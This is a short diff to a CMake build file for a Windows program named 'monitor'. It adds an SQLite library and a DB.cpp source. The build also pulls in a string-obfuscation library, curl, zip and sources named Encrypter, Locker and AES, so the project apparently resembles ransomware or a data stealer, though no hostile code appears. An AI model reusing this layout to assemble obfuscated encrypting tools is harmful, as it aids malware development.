@@ -5,10 +5,14 @@ include(CTest)
 enable_testing()
 
 add_subdirectory(libs/curl)
-SET(CURL_INCLUDE_DIR "libs/curl/include")
 add_subdirectory(libs/zip)
+add_subdirectory(libs/SQLiteCpp-master)
+
+SET(CURL_INCLUDE_DIR "libs/curl/include")
+SET(SQLITECPP_USE_STATIC_RUNTIME TRUE)
 
 include_directories("libs/zip/src")
+include_directories("libs/SQLiteCpp-master/include/SQLiteCpp")
 include_directories("libs/ADVobfuscator/Lib")
 include_directories("libs/json-develop/single_include")
 SET(CURL_LIBRARY "libcurl")
@@ -25,8 +29,8 @@ else()
     add_link_options(-static-libstdc++ -static-libgcc)
 endif()
 
-link_libraries(	Pdh libcurl Ws2_32.lib zip)
-add_executable(monitor main.cpp Request.cpp AES.cpp Encrypter.cpp Locker.cpp Utils.cpp SHA256.cpp ZipExt.cpp App.cpp)
+link_libraries(	Pdh libcurl Ws2_32.lib zip SQLiteCpp sqlite3)
+add_executable(monitor main.cpp Request.cpp AES.cpp Encrypter.cpp Locker.cpp Utils.cpp SHA256.cpp ZipExt.cpp App.cpp DB.cpp)
 
 set(CPACK_PROJECT_NAME ${PROJECT_NAME})
 set(CPACK_PROJECT_VERSION ${PROJECT_VERSION})
